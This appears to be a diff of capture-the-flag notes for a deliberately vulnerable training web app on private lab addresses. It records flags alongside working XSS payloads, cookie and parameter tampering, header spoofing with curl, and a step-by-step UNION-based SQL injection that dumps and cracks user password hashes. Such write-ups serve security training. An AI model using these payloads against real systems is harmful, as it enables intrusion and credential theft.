@@ -1,16 +1,19 @@
 Cookie md5 admin true
 
 Flag: df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
+
 ---
 
 http://10.13.199.248/?page=survey change vote value to 99999
 
 Flag: 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
+
 ---
 
 http://10.13.199.248/index.php?page=recover inspect element change reset email to own
 
 Flag: 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
+
 ---
 
 Xss on feedback page
@@ -18,7 +21,9 @@ Xss on feedback page
 `/><script>alert(1);</script>`
 
 Flag: 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
+
 ---
+
 robots.txt
 The file robots.txt is often used on webpages to tell web crawlers how they should access or disallow them from parts of the website,
 for example to hide irrelevant results from Google search or prevent the server from overloading from crawlers loading content.
@@ -33,7 +38,9 @@ password doesn't work on the login but trying out subdirectories we find {ip}/ad
 login on {ip}/admin
 
 Flag: d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
+
 ---
+
 robots.txt 2
 /whatever subdirectory
 
@@ -47,6 +54,7 @@ inspect element to see comments with hints
 curl --referer https://www.nsa.gov/ http://10.12.179.218/\?page\=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c --user-agent "ft_bornToSec" -s | grep flag
 
 Flag: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
 ---
 
 Directory traversal
@@ -83,6 +91,7 @@ base64-> `PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=`
 http://{ip}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
 
 Flag: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
+
 ---
 
 Members SQL injection
@@ -110,3 +119,35 @@ Trying
 >Unknown column '3' in 'order clause'
 
 There are only 2 columns, first name and last name. 
+
+`1 or 1=1 UNION SELECT version(),user()--`
+>First name: 5.5.44-0ubuntu0.12.04.1
+Surname : borntosec@localhost
+
+We can use this: `1 or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables` to get information about what kind of data we can now steal from the tables. Let's try the "users" table, using the string doesn't seem to work but encoding users to hex works -> 0x7573657273
+
+`1 or 1=1 UNION SELECT NULL,group_concat(column_name, 0x0a) FROM information_schema.columns where table_name = 0x7573657273`
+>user_id,first_name,last_name,town,country,planet,Commentaire,countersign
+
+
+1 or 1=1 UNION SELECT NULL,group_concat(town,country,planet,Commentaire,countersign) from users
+>First name: 
+Surname : Honolulu AmericaEARTHAmerca !2b3366bcfd44f540e630d4dc2b9b06d9,BerlinAllemagneEarthIch spreche kein Deutsch.60e9032c586fb422e2c16dee6286cf10,MoscouRussiaEarth????? ????????????? ?????????e083b24a01c483437bcf4a9eea7c1b4d,424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
+
+`1 or 1=1 UNION SELECT NULL,group_concat(countersign) from users`
+
+>2b3366bcfd44f540e630d4dc2b9b06d9,60e9032c586fb422e2c16dee6286cf10,e083b24a01c483437bcf4a9eea7c1b4d,5ff9d0165b4f92b14994e5c685cdce28
+
+First two and last one are encrypted with MD5
+>YesWeCan
+oktoberfest
+???
+FortyTwo
+
+>Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+Sha256 on fortytwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+Flag: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+---
